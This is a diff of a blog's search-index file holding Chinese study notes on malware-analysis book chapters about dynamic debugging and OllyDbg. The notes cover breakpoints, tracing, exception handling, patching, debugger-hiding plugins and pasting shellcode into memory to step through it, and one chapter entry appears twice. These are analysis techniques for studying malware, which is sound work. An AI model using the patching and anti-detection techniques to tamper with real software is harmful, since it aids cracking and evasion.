-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>第9章 OllyDbg</title>
       <link href="/%E7%AC%AC9%E7%AB%A0%20OllyDbg/"/>
       <url>/%E7%AC%AC9%E7%AB%A0%20OllyDbg/</url>
       
         <content type="html"><![CDATA[<h1 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h1><p>OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security公司买下 OllyDbg1.1的基础代码,并将其更名为Immunity Debugger(ImmDbg)。在此之前, OllyDbg直都是恶意代码分析师和漏洞开发者们的首选调试器。Immunity的目的是使这个工具适合漏洞开发者们使用,并且修复了OllDbg中的一些Bug。<br>在完成 OllyDbg的外观GUI修改,提供带有完整功能的 Python解释器API后,一些用户开始用ImmDbg替代OllyDbg</p><h2 id="9x1-加载恶意代码"><a href="#9x1-加载恶意代码" class="headerlink" title="9x1 加载恶意代码"></a>9x1 加载恶意代码</h2><h3 id="1-打开一个可执行文件"><a href="#1-打开一个可执行文件" class="headerlink" title="1. 打开一个可执行文件"></a>1. 打开一个可执行文件</h3><p>选择OllyDbg界面中的File-&gt;Open, 然后浏览到要加载的可执行文件。<br>如果要调试的程序需要参数,则在Open对话框的 Arguments输入框给出(只能在加载期间给OllyDgb传入命令行参数)</p><p>默认情况下,如果能够确定软件的入口点位置,即 WinMain, OllyDbg会在这个位置暂停程序的执行。否则OllyDbg会在软件PE头部提供的入口点处中断。另外,你也可以选择 OllyDbg的DebuggingOptions菜单(Options→Debugging Options)来修改这些启动选项。</p><h3 id="2-附加调试器到一个运行程序"><a href="#2-附加调试器到一个运行程序" class="headerlink" title="2. 附加调试器到一个运行程序"></a>2. 附加调试器到一个运行程序</h3><p>为将OllyDbg附加到一个进程上,选择OllyDbg界面的File→ Attach。然后会弹出一个菜单,你可以在这个菜单中选择要附加的进程(如果有多个同名的进程,你需要知道调试进程的ID)。接下来选择要调试的进程,并从菜单中选择Attach。此刻OllyDbg会立即暂停这个程序以及它所有的线程。</p><p>OllyDbg附加上进程后,进程当前执行线程的代码会被暂停,并显示在OllyDbg的窗口中。然而，有可能在进程正在执行一个系统DLL中的指令时把它暂停了,当这种情况发生时,回到主代码最简单的办法就是在整个代码段中设置一个访问断点。这样就会让这个程序在下次访问代码段时中断执行。</p><h2 id="9x2-OllyDbg的接口"><a href="#9x2-OllyDbg的接口" class="headerlink" title="9x2 OllyDbg的接口"></a>9x2 OllyDbg的接口</h2><blockquote><p> <strong>反汇编面板窗口</strong><br> 这个窗口显示了被调试程序的代码一当前指令指针的前后一些指令。通常，下一条将要被执行的指令在这个窗口中高亮显示。如果想要修改指令或数据(或添加一些汇编指令),请在这个窗口中按空格键。</p><p><strong>寄存器面板窗口</strong><br>这个窗口用来显示被调试程序寄存器的当前状态，代码被调试时，如果一条指令运行过程中修改了寄存器的值，则寄存器窗口中的这个寄存器就会从黑色变为红色。</p><p><strong>栈面板窗口</strong><br>这个窗口用来显示被调试线程堆栈在内存中的当前状态。这个窗口总是显示给定线程的栈项。可以通过右击一个栈单元，选择Modify，来操作这个窗口中的栈。OllyDbg会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</p><p><strong>内存转储面板窗口</strong><br>这个窗口用来显示被调试进程的实时内存转储。在这个窗口中按CtrI+G组合键，并输入一个内存位置，可以跳转到任何内存地址（也可以单击一个内存地址，然后选择Follow in Dump，来转储那个内存地址）。如果想要编辑这个窗口中的内存，右击它并选择Binary-&gt;Edit。使用这种方式也可以修改恶意代码存储在RAM中的全局变量以及其他一些数据。</p></blockquote><h2 id="9x3-内存映射"><a href="#9x3-内存映射" class="headerlink" title="9x3 内存映射"></a>9x3 内存映射</h2><p>内存映射窗口( View-&gt;Memory)显示了被调试程序分配的所有内存块。<br>内存映射是查看程序在内存中布局的一个好方式。你可以双击内存映射中的任意一行，显示那个段的内存转储。你也可以通过右击一段内存转储，然后选择View in Disassembler的方式，将其中的数据发送到反汇编窗口。</p><h3 id="1-基地址重定位"><a href="#1-基地址重定位" class="headerlink" title="1. 基地址重定位"></a>1. 基地址重定位</h3><p>内存映射能够帮助你理解一个PE文件在运行时如何被重定位。基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。</p><blockquote><p><strong>基地址</strong><br>   Windows中的所有PE文件都有一个预定的基地址，它在PE文件头中被称为映像基地址。</p><p>  Windows允许映像基地址与要被加载到内存的实际地址不一致，虽然大部分情况下是一致的。大部分执行程序都被预定加载到0x00400000处，这个地址是Windows平台下大多数编译器使用的默认地址。不过，开发者可以选择将执行程序的基地址设置为一个与此不同的地址。支持地址空间布局随机化( ASLR)安全增强特性的可执行程序会经常被重定位。这就是说.DLL的重定位变得更加普遍。<br>    因为一个应用程序可能导入许多DLL，而每个DLL都有一个希望被加载到内存中的预定基地址，所以重定位十分必要。假设有两个DLL被加载，并且它们拥有相同的预加载地址0x10000000，则它们不可能都加载到这个位置,Windows会将其中一个DLL加载到这个地址，另一个DLL重定位到另外某个地址。<br>    Windows操作系统自带的大多数DLL有不同的预定基地址，而且它们之间不会产生冲突。然而第三方应用程序会经常出现使用同一个预定基地址的情况。</p><p><strong>绝对地址与相对地址</strong><br>重定位过程比简单将代码加载到另一个位置要复杂得多。虽然多数指令会引用内存中的相对地址，但是有些却引用内存的绝对地址。</p></blockquote><h2 id="9x4-查看线程和堆栈"><a href="#9x4-查看线程和堆栈" class="headerlink" title="9x4 查看线程和堆栈"></a>9x4 查看线程和堆栈</h2><p>恶意代码经常使用多线程。你可以通过选择View-&gt;Threads，调出线程面板窗口，查看一个程序的当前线程。这个窗口显示了线程的内存位置，以及它们当前的活动状态（活动、暂停，或者挂起）。<br>    由OllyDbg是单线程的，可能需要你先暂停所有的线程，设置一个断点后，继续运行程序，这样可以确保在一个特定线程内调试。单击主工具栏中的暂停按钮，可以暂停所有活动的线程。</p><h2 id="9x5-执行代码"><a href="#9x5-执行代码" class="headerlink" title="9x5 执行代码"></a>9x5 执行代码</h2><p><img src="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" alt="im"></p><h2 id="9x6-断点"><a href="#9x6-断点" class="headerlink" title="9x6 断点"></a>9x6 断点</h2><p><img src="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" alt="enter description here"></p><h3 id="1-软件断点"><a href="#1-软件断点" class="headerlink" title="1. 软件断点"></a>1. 软件断点</h3><p>调试字符串解码函数时，软件断点特别有用。</p><h3 id="2-条件断点"><a href="#2-条件断点" class="headerlink" title="2. 条件断点"></a>2. 条件断点</h3><p>条件断点是软件断点的一种，只有某些条件得到满足时这个断点才能中断执行程序。OllyDbg调试器允许使用表达式，来设置断点，每当断点命中时，都会先计算表达式的值，如果其值不等于零，断点生效，程序运行中断。</p><p>对于调用频繁的API函数，仅当特定参数传给它时才中断程序执行，这种情况下，条件软件断点特别有用。</p><blockquote><p><strong>设置条件断点的步骤</strong></p><ol><li>右击反汇编面板窗口中函数的第一条指令，选择Breakpoint-&gt;Conditional。然后会弹出一个对话框，要求你输入条件表达式.</li><li>在步骤l弹出的对话框中输入表达式，然后单击OK按钮。</li><li>单击Play按钮，并等待条件断点命中。</li></ol></blockquote><h3 id="3-硬件断点"><a href="#3-硬件断点" class="headerlink" title="3. 硬件断点"></a>3. 硬件断点</h3><p>硬件断点非常强大，它可以在不改变你的代码、堆栈以及任何目标资源的前提下进行调试。</p><p>OllyDbg中，在某一指令上设置硬件断点的方法是：右击该指令选择Breakpoint-&gt;Hardware，on Execution。</p><p>通过使用Debugging Options菜单，你可以告诉OllyDbg默认使用硬件断点来代替软件断点。同时，使用硬件断点可以帮助你防御反调试技术，如软件断点扫描。</p><h3 id="4-内存断点"><a href="#4-内存断点" class="headerlink" title="4. 内存断点"></a>4. 内存断点</h3><p>在一个内存块上设置内存断点，可以让被调试程序在访问这段内存时中断执行。OllyDbg支持软件内存断虑和硬件内存断点，此外还支持对内存进行读、写、执行或其他权限访问是否产生中断的设置。</p><p>为了设置一个基本的内存断点，在内存转储面板窗口中选择一部分内存，或者在内存映射面板窗口中选择一个内存段，然后右击它，选择Breakpoint-&gt;Memory,on Access。OllyDbg只允许你一次设置一个内存断点。如果你设置了一个新的内存断点，那么之前设置的内存断点会被移除。</p><p>在分析恶意代码时，如果想知道恶意代码何时使用了某个加载的DLL，这时内存断点将变得特别有用。可以设置这样一个内存断点，当DLL中的代码运行时程序被中断。下面是实现这种功能的步骤：</p><blockquote><p>1．打开内存映射面板窗门，并右i键单击需要跟踪DLL的.text段（.text段包含DLL的可执行代码）。<br>2．选择Set Memory Breakpoint on Access.<br>3．按F9键或者单击Play按钮恢复程序运行。<br>    当心用程序运行到DLL的．text段代码时．会中断执行。</p></blockquote><h2 id="9x7-加载DLL"><a href="#9x7-加载DLL" class="headerlink" title="9x7 加载DLL"></a>9x7 加载DLL</h2><p>除了可以调试加载的或者附加的可执行程序，OllyDbg还可以调试DLL。然而由于DLL不能直接运行．OllyDbg使用了一个名为loaddll. exe的虚拟程序来加载它。由于恶意代码经常打包成DLL．且其大部分代码都包含在DLL的DlIMain函数（DLL的初始化函数，当DLL被加载到进程时被调用）中，因此OllyDbg的这种技术非常有用。默认情况下，一旦DLL被加载，OllyDbg会在DLL的入口点(DllMain)处中断。</p><p>如果要用参数调用被调试DLL中的导出函数，首先用OllyDbg加载DLL．然后在其入口点处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，以及其他一些DLL要求的初始化操作。</p><h2 id="9x8-跟踪"><a href="#9x8-跟踪" class="headerlink" title="9x8 跟踪"></a>9x8 跟踪</h2><p>跟踪是一种强大的调试技术，它可以记录程序详细的运行信息，供你查阅。OllyDbg支持多种跟踪功能，包括：标准回溯跟踪、堆栈调用跟踪和运行跟踪等。</p><h3 id="1-标准回溯跟踪"><a href="#1-标准回溯跟踪" class="headerlink" title="1. 标准回溯跟踪"></a>1. 标准回溯跟踪</h3><p>每次你在反汇编面板窗口上执行Step Into和Step Over操作时，OllyDbg都会记录下这种动作。你可以使用键盘上的减号键（一）。退回到上一步运行的指令：使用加号键(+)．执行下一条指令。<br>如果使用Step Into，你可以跟踪每一步的执行。如果使用Step Over，只能单步跟踪step over之前区域，回溯之后再决定是否进入另一个区域。</p><h3 id="2-堆栈调用跟踪"><a href="#2-堆栈调用跟踪" class="headerlink" title="2. 堆栈调用跟踪"></a>2. 堆栈调用跟踪</h3><p>在OllyDbg中，通过堆栈跟踪可以查看一个给定函数的执行路径。为了查看堆栈调用，在主菜单中选择View-&gt;Call Stack．会弹出一个窗口，窗口中显示了当前位置之前的调用序列。<br>    为了跟踪堆栈调用，单击地址或者堆栈调用窗口中的某段。当你在那个堆栈位置时，寄存器和堆栈并不会显示什么，除非你执行运行跟踪操作。</p><h3 id="3-运行跟踪"><a href="#3-运行跟踪" class="headerlink" title="3. 运行跟踪"></a>3. 运行跟踪</h3><p>运行跟踪是指在运行代码时，OllyDbg会保存所有运行过的指令，以及它们运行过程中对寄存器和标志所做的改变。</p><blockquote><p><strong>几种激活运行跟踪的方法</strong><br>·  在反汇编面板窗口中高亮你要跟踪的代码。右键单击代码，选择Run Trace–Add Selection。代码运行后，选择View-&gt;Run Trace，查看运行过的指令。使用键盘上的一（减号键）和+（加号键），来上下浏览代码（与标准回溯跟踪小节讨论的一样）。使用这种方法，可以查看每条指令执行时所有寄存器发生的变化。<br>    ·  使用Trace Into与Trace Ovcr选项。这些选项比Add Selection更容易使用，因为它们不需要你选择需要跟踪的代码。Trace Into可以单步执行并且记录命中断点前所有的运行指令，但Trace Over仅记录当前正在运行函数的指令。<br>·  选择Select Debug-&gt;Set Condition。可以在命中条件使程序暂停之前，跟踪程序的运行。如果你想在条件断点命中时停止跟踪，并且从发生中断的位置，回溯跟踪查看如何或者为什么发生中断，这种跟踪方法将对你非常有帮助。</p></blockquote><h3 id="4-跟踪Poison-lvy"><a href="#4-跟踪Poison-lvy" class="headerlink" title="4. 跟踪Poison lvy"></a>4. 跟踪Poison lvy</h3><h2 id="9x9-异常处理"><a href="#9x9-异常处理" class="headerlink" title="9x9 异常处理"></a>9x9 异常处理</h2><p>默认情况下．OllyDbg被附加后会产生异常，附加程序也会停止运行，此时调试器开始接管控制权。调试器可以处理该异常，也可以将异常转到被调试的应用程序处理。当异常发生时．OllyDbg会暂停运行，然后你可以使用下列任一种方法，来决定是否将异常转到应用程序处理：</p><blockquote><p>·  Shift+F7将进入异常。<br>·  Shift+F8将跳过异常。<br>·  Shift+F9将运行异常处理。</p></blockquote><p>OllyDbg提供异常处理的选项，这些选项可以告诉调试器忽略某些特定异常，并且将它们直接转到应用程序处理。<br><img src="https://i.loli.net/2018/07/20/5b519f1aae2be.png" alt="im"></p><h2 id="9x10-修补"><a href="#9x10-修补" class="headerlink" title="9x10 修补"></a>9x10 修补</h2><p>OllyDbg可以很容易修改实时数据，如寄存器和标志。它也可以将汇编形式的修补代码直接插入到一个程序。你可以通过高亮选择某块区域来修改指令或内存，右击这块区域，选择Binary-&gt;Edit，会弹出让你添加操作码和数据的窗口（OllyDbg具有一些特殊功能，可以使用00项或NOP指令填充程序）。</p><h2 id="9x11-分析shellcode"><a href="#9x11-分析shellcode" class="headerlink" title="9x11 分析shellcode"></a>9x11 分析shellcode</h2><p>OllyDbg有一种分析shellcodc的简单方法。下面是使用这种方法的步骤:</p><blockquote><p>1．将shellcode从一个十六进制编辑器复制到剪切板。<br>2．在内存映射面板窗口中，选择类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享）。<br>3．双击内存映射面板窗口的某行，会弹出一个十六进制转储窗口，你可以检查它的内容。该区域应该包含几百个连续为0的字节。<br>4．在内存映射面板窗口中，右击被选择的区域，选择Set Access—Full Access，赋予该区域读、写、运行的权限。<br>5．返回内存转储窗口。0字节填充的高亮区域足以容纳整个sheUcode，右键单击选择的内存区域，然后选择Binary一Binary Paste。这个操作将步骤l中复制的shellcode粘贴到选择的区域。<br>6．设置EIP寄存器，指向你修改的内存区域（右击反汇编面板窗口的一条指令，选择New Origin Here，你可以很容易设置EIP寄存器的值）。</p></blockquote><p>上述步骤结束后，你就可以像对待正常应用程序一样运行、调试和单步整个shellcode了</p><h2 id="9x12-协助功能"><a href="#9x12-协助功能" class="headerlink" title="9x12 协助功能"></a>9x12 协助功能</h2><p>OllyDbg提供了多种机制来帮助分析，包括下面几种：</p><blockquote><p>  <strong>日志( Logging)</strong><br>  OllyDbg维护一个持续可用的事件日志。要访问这个日志，选择View-&gt;Log。此日志显示了加载的可执行模块、触发的断点，以及其他一些信息。另外，在分析过程中，日志还可以帮助你找出为到达某一特定状态而执行的那些操作。<br>    <strong>监视(Watches)窗口</strong><br>    OllyDbg支持使用监视窗口，用它可以查看你生成表达式的值。程序运行时，这个表达式会不断更新。你可以通过View—Watches，来访问监视窗口，你也可以在监视窗口中按下空格键，来设置表达式。<br>    <strong>帮助（Help）</strong>  OllyDbg的Help-&gt;Contents选项为运算表达式的书写提供了详细说明。当你想监视一些特定数据或者复杂函数时，这个帮助非常有用。例如，如果想监控EAX+ESP+4处的内存，你只需要输入表达式[EAX+ESP+4]。<br>    <strong>标注（Labeling）</strong>  如IDA Pro一样，你可以为OllyDbg中的子例程和循环添加标注。OllyDbg中的标注是为调试程序中某个地址设置的一个简单符号名称。为了在反汇编面板窗口设置标注，右击一个地址选择Label，此时会弹出提示输入标注的窗口。设置完标注以后，对这个地址的所有引用都会被该标注代替。</p></blockquote><h2 id="9x13-插件"><a href="#9x13-插件" class="headerlink" title="9x13 插件"></a>9x13 插件</h2><p>OllyDbg拥有一些标准插件，其中一些可以免费下载到。在网站 <a href="http://www.openrce.org/downloads/browse/OllyDbg_Plugins" target="_blank" rel="noopener">http://www.openrce.org/downloads/browse/OllyDbg_Plugins</a> 中，你可以找到一些对分析恶意代码有用的OllyDbg插件。<br>    OllyDbg的插件以DLL形式存在，如果要安装某个插件，你将这个插件的DLL放到OllyDbg的安装根目录下即可。一旦将DLL放入OllyDbg的安装根目录，OllyDbg会自动识别这个插件，并将其添加到插件菜单。</p><h3 id="1-OllyDump"><a href="#1-OllyDump" class="headerlink" title="1. OllyDump"></a>1. OllyDump</h3><p>OllyDump是OllyDbg最常使用的插件，它能够将一个被调试的进程转储成一个PE文件。当加载器加载一个可执行文件时，OllyDump会尝试逆向这个进程。然而，OllyDump利用的是进程内存中各段（代码段、数据段等）的状态。OllyDbg最典型的应用就是脱壳。</p><h3 id="2-调试器隐藏插件"><a href="#2-调试器隐藏插件" class="headerlink" title="2. 调试器隐藏插件"></a>2. 调试器隐藏插件</h3><p>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。为了防止恶意代码使用反调试技术，恶意代码分析人员通常在分析恶意代码期间，一直运行调试器隐藏插件。这个插件主要针对IsDebuggerPresent检测、FindWindow检测、未处理异常欺骗以及用OutputDebugString反OllyDbg调试等反调试技术。</p><h3 id="3-命令行"><a href="#3-命令行" class="headerlink" title="3. 命令行"></a>3. 命令行</h3><p>要打开命令行窗口，选择Plugins-&gt;Command  Line-&gt;Command  Line。<br><img src="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" alt="im"></p><h3 id="4-书签"><a href="#4-书签" class="headerlink" title="4. 书签"></a>4. 书签</h3><p>OllyDbg默认情况下自带书签插件，书签插件可以将一个内存位置加到书签中，利用书签，下次不需要记住就可以轻松获取那个内存地址。右击反汇编面板窗口中的地址，选择Bookmark-&gt;Insert Bookmark．可以添加书签。选择Plugins-&gt;Bookmarks-&gt;Bookmarks，可以浏览书签，然后单击书签可以跳转到该书签代表的地址。</p><h2 id="9x14-脚本调试"><a href="#9x14-脚本调试" class="headerlink" title="9x14 脚本调试"></a>9x14 脚本调试</h2><p>因为OllyDbg的插件被编译成DLL，创建或者修改一个插件往往是一个复杂的过程。因此，当需要扩展调试功能时，我们采用ImmDbg。它使用Python脚本来扩展功能，并且提供了易于使用的API接口。<br>    ImmDbg的Python API包含很多实用工具和函数。例如，可以将你的脚本像本地代码一样集成到调试器中，创建自定义的表格、图形和各种接u。利用脚本分析恶意代码的原因有多种，典型的包括反调试器补丁、内联函数钩子( hook)以及函数参数日志等，其中许多代码可以在网上找到。<br>    ImmDbg最常见的Python脚本类型是PyCommand．这个Python脚本位于ImmDbg安装目录下的PyCommands\目录中。编写好Python脚本后，必须将其放到这个目录下才能运行。这些脚本从命令栏运行，并且需要加上前缀“!”，如在命令行中输入!list命令，可以列出可用的PyCommand列表。<br>    PyCommand类型脚本拥有如下结构：</p><blockquote><p>．  一系列Import导入语句，用来导入Python的模块（同所有的Python脚本一样）。通过immlib或immutils模块访问ImmDbg的功能。<br>．    一个主函数，用来读取命令行参数（以Python列表传递）。<br>·  PyCommand的代码实现部分。<br>·  返回包含字符串的值。一旦脚本运行结束，主调试器会用这个返回字符串更新状态栏。</p></blockquote><p>From <a href="https://kabeor.github.io/第9章 OllyDbg/">https://kabeor.github.io/第9章 OllyDbg/</a> bye</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 病毒分析 </category>
-          
-          <category> 《恶意代码分析实战》笔记 </category>
-          
-          <category> 第三篇 动态分析高级技术篇 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 病毒分析 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>第8章 动态调试</title>
-      <link href="/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
-      <url>/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
-      
-        <content type="html"><![CDATA[<h1 id="第8章-动态调试"><a href="#第8章-动态调试" class="headerlink" title="第8章 动态调试"></a>第8章 动态调试</h1><h2 id="8x1-源代码级与汇编级的调试器"><a href="#8x1-源代码级与汇编级的调试器" class="headerlink" title="8x1 源代码级与汇编级的调试器"></a>8x1 源代码级与汇编级的调试器</h2><h2 id="8x2-内核模式与用户模式调试"><a href="#8x2-内核模式与用户模式调试" class="headerlink" title="8x2 内核模式与用户模式调试"></a>8x2 内核模式与用户模式调试</h2><p>在用户模式中，调试器与被调试的代码运行在同一个系统中<br>内核模式调试一般需要两个不同的系统<br>WinDbg是当前唯一支持内核调试的流行调试器</p><h2 id="8x3-使用调试器"><a href="#8x3-使用调试器" class="headerlink" title="8x3 使用调试器"></a>8x3 使用调试器</h2><h3 id="1-单步调试"><a href="#1-单步调试" class="headerlink" title="1. 单步调试"></a>1. 单步调试</h3><h3 id="2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into"><a href="#2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into" class="headerlink" title="2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)"></a>2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)</h3><blockquote><p>现在是使用VMware record/replay功能的最佳时机。当你单步跳过一个不会返回的函教时，可以通过重放调试会话来纠正你的错误。开始调试时就启动记录。然后，当单步跳过一个不会返回的函数时，停止记录。重放到单步跳过的函数前面，然后停止重放，取得控制权,但这次单步跳入该函数。</p></blockquote><h3 id="3-用断点暂停执行"><a href="#3-用断点暂停执行" class="headerlink" title="3. 用断点暂停执行"></a>3. 用断点暂停执行</h3><blockquote><p>软件执行断点</p></blockquote><p>调试器通过使用0XCC,即指令INT 3的机器码，重写指令的首个字节来实现软件断点，0XCC被设计来供调试器使用。当0XCC指令执行后，操作系统会产生一个异常，然后控制权转到调试器。</p><blockquote><p>硬件执行断点</p></blockquote><p>利用专门的硬件寄存器，x86结构可以支持硬件执行断点。处理器每次执行一个指令时，硬件都会检测指令的指针是否与断点地址相等。硬断点并不关心断点地址存储哪些字节。当调试修改自身的代码时，硬断点会非常有益。硬断点相比于软断点的另一个优点是，它们可以设置访问中断的断点而不是执行中断的断点。</p><p>硬件执行断点有个明显缺点：只有四个硬件寄存器存储断点的地址。<br>硬断点的深层缺陷之一是它们容易被运行的程序修改。虽然CPU芯片有八个调试寄存器，但只有六个在使用。前四个寄存器DR0〜DR3用来存储断点地址，调试控制寄存器（DR7)存储DR0〜DR3寄存器中的值是否有效，以及它们是否表示读、写或者执行断点等信息。恶意代码可以修改这些寄存器来干扰调试器。x86芯片组具有防御该干扰的功能。通过设置DR7寄存器中的通用探测（General Detect)标志位，任何执行mov指令访问调试寄存器的操作都会触发中断。而这让你能够探测调试寄存器的改变。</p><blockquote><p>条件断点</p></blockquote><p>条件断点是软件断点的一种，它在某些条件满足时才会被触发。条件断点通过调试器总是接收的软断点来实现的。调试器计算条件，如果条件不满足，它自动继续执行而不通知用户。另外，不同的调试器支持不同的条件。</p><h2 id="8x4-异常"><a href="#8x4-异常" class="headerlink" title="8x4 异常"></a>8x4 异常</h2><p>异常是调试器取得运行程序控制权的基本方式。本质上，除了断点产生异常外，与调试无关的事件，如非法内存访问、除0操作也会产生异常</p><h3 id="1-首次和二次异常处理"><a href="#1-首次和二次异常处理" class="headerlink" title="1. 首次和二次异常处理"></a>1. 首次和二次异常处理</h3><p>调试器通常有两次机会来处理同一个异常：首次处理异常和二次处理异常。调试器第一次附加到进程时，会发生一个异常，然后被调试的程序停止执行，此时调试器开始获得控制权。调试器可以自己处理异常，也可以将异常转给被调试的应用程序处理。</p><p>如果程序注册了一个异常处理函数，它会在调试器处理异常后，获得处理异常的权限。<br>如果应用程序没有处理异常，调试器将获得另一个处理它的机会—— 二次异常处理。调试器接收到一个二次处理的异常后，意味着如果程序没有附加到调试器就会崩溃。为了让应用程序正常运行，调试器必须处理异常。</p><h3 id="2-常见异常"><a href="#2-常见异常" class="headerlink" title="2. 常见异常"></a>2. 常见异常</h3><blockquote><p>最常见的是执行INT 3指令时产生的异常。调试器有专门的代码处理INT 3<br>异常，而操作系统则把它和其他异常一样对待。<br>应用程序可能包含处理INT 3异常的指令，但附加调试器到程序后，调试器将获得首先处理异常权限。如果调试器将异常传给程序，程序的异常处理函数会处理它。</p><p>单步调试也作为操作系统内的一个异常来实现。标志寄存器中的陷阱标志（trap flag)用于单步 调试。陷阱标志置位后，处理器每执行一条指令就会产生异常。</p><p>当程序试图去访问一个它无权访问的内存位置时，将产生内存访问冲突（memory-access violation)异常。这种异常经常因为内存地址无效而发生，也可能是因为访问了受保护而无权访问的内存位置。</p><p>另外，一些指令只在处理器处于特权模式时才能执行。如果程序尝试着在非特权模式下执行它们，则处理器会产生异常。</p></blockquote><h2 id="8x5-使用调试器修改可执行文件"><a href="#8x5-使用调试器修改可执行文件" class="headerlink" title="8x5 使用调试器修改可执行文件"></a>8x5 使用调试器修改可执行文件</h2><p>调试器可以用来改变程序的执行方式。可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="8x6-修改可执行程序的实践"><a href="#8x6-修改可执行程序的实践" class="headerlink" title="8x6 修改可执行程序的实践"></a>8x6 修改可执行程序的实践</h2><p>End..</p><p>From <a href="https://kabeor.github.io/第8章 动态调试/">https://kabeor.github.io/第8章 动态调试/</a> bye</p>]]></content>
       
       
       <categories>
@@ -648,6 +644,35 @@
           <category> 《恶意代码分析实战》笔记 </category>
           
           <category> 第二篇 静态分析高级技术篇 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 病毒分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>第8章 动态调试</title>
+      <link href="/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
+      <url>/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="第8章-动态调试"><a href="#第8章-动态调试" class="headerlink" title="第8章 动态调试"></a>第8章 动态调试</h1><h2 id="8x1-源代码级与汇编级的调试器"><a href="#8x1-源代码级与汇编级的调试器" class="headerlink" title="8x1 源代码级与汇编级的调试器"></a>8x1 源代码级与汇编级的调试器</h2><h2 id="8x2-内核模式与用户模式调试"><a href="#8x2-内核模式与用户模式调试" class="headerlink" title="8x2 内核模式与用户模式调试"></a>8x2 内核模式与用户模式调试</h2><p>在用户模式中，调试器与被调试的代码运行在同一个系统中<br>内核模式调试一般需要两个不同的系统<br>WinDbg是当前唯一支持内核调试的流行调试器</p><h2 id="8x3-使用调试器"><a href="#8x3-使用调试器" class="headerlink" title="8x3 使用调试器"></a>8x3 使用调试器</h2><h3 id="1-单步调试"><a href="#1-单步调试" class="headerlink" title="1. 单步调试"></a>1. 单步调试</h3><h3 id="2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into"><a href="#2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into" class="headerlink" title="2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)"></a>2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)</h3><blockquote><p>现在是使用VMware record/replay功能的最佳时机。当你单步跳过一个不会返回的函教时，可以通过重放调试会话来纠正你的错误。开始调试时就启动记录。然后，当单步跳过一个不会返回的函数时，停止记录。重放到单步跳过的函数前面，然后停止重放，取得控制权,但这次单步跳入该函数。</p></blockquote><h3 id="3-用断点暂停执行"><a href="#3-用断点暂停执行" class="headerlink" title="3. 用断点暂停执行"></a>3. 用断点暂停执行</h3><blockquote><p>软件执行断点</p></blockquote><p>调试器通过使用0XCC,即指令INT 3的机器码，重写指令的首个字节来实现软件断点，0XCC被设计来供调试器使用。当0XCC指令执行后，操作系统会产生一个异常，然后控制权转到调试器。</p><blockquote><p>硬件执行断点</p></blockquote><p>利用专门的硬件寄存器，x86结构可以支持硬件执行断点。处理器每次执行一个指令时，硬件都会检测指令的指针是否与断点地址相等。硬断点并不关心断点地址存储哪些字节。当调试修改自身的代码时，硬断点会非常有益。硬断点相比于软断点的另一个优点是，它们可以设置访问中断的断点而不是执行中断的断点。</p><p>硬件执行断点有个明显缺点：只有四个硬件寄存器存储断点的地址。<br>硬断点的深层缺陷之一是它们容易被运行的程序修改。虽然CPU芯片有八个调试寄存器，但只有六个在使用。前四个寄存器DR0〜DR3用来存储断点地址，调试控制寄存器（DR7)存储DR0〜DR3寄存器中的值是否有效，以及它们是否表示读、写或者执行断点等信息。恶意代码可以修改这些寄存器来干扰调试器。x86芯片组具有防御该干扰的功能。通过设置DR7寄存器中的通用探测（General Detect)标志位，任何执行mov指令访问调试寄存器的操作都会触发中断。而这让你能够探测调试寄存器的改变。</p><blockquote><p>条件断点</p></blockquote><p>条件断点是软件断点的一种，它在某些条件满足时才会被触发。条件断点通过调试器总是接收的软断点来实现的。调试器计算条件，如果条件不满足，它自动继续执行而不通知用户。另外，不同的调试器支持不同的条件。</p><h2 id="8x4-异常"><a href="#8x4-异常" class="headerlink" title="8x4 异常"></a>8x4 异常</h2><p>异常是调试器取得运行程序控制权的基本方式。本质上，除了断点产生异常外，与调试无关的事件，如非法内存访问、除0操作也会产生异常</p><h3 id="1-首次和二次异常处理"><a href="#1-首次和二次异常处理" class="headerlink" title="1. 首次和二次异常处理"></a>1. 首次和二次异常处理</h3><p>调试器通常有两次机会来处理同一个异常：首次处理异常和二次处理异常。调试器第一次附加到进程时，会发生一个异常，然后被调试的程序停止执行，此时调试器开始获得控制权。调试器可以自己处理异常，也可以将异常转给被调试的应用程序处理。</p><p>如果程序注册了一个异常处理函数，它会在调试器处理异常后，获得处理异常的权限。<br>如果应用程序没有处理异常，调试器将获得另一个处理它的机会—— 二次异常处理。调试器接收到一个二次处理的异常后，意味着如果程序没有附加到调试器就会崩溃。为了让应用程序正常运行，调试器必须处理异常。</p><h3 id="2-常见异常"><a href="#2-常见异常" class="headerlink" title="2. 常见异常"></a>2. 